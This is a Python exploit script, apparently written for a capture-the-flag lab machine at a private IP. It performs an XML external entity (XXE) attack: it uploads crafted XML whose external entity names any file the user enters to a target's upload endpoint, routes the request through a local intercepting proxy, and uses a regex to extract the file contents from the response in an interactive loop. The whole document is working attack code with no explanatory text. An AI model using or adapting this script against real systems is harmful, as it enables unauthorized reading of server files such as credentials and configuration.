import requests
import re

def PerformXXE(filename):
    xml = f"""<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (ANY)>
<!ENTITY file SYSTEM "{filename}">
]>
<Test>
<Author>Unimportant</Author>
<Subject>Test1
&file;
Test2</Subject>
<Content>Unimportant</Content>
 </Test>"""

    files = { 'file':('filename.xml', xml) }
    response = requests.post('http://10.10.10.91:5000/upload', \
            proxies = {'http':'http://127.0.0.1:8080'}, \
            files = files).text
    result = re.findall(r'Test1\s(.*)\s\sTest2', response, re.DOTALL)[0]
    return(result)

while True:
    fname = input("> ")
    print(PerformXXE(fname))
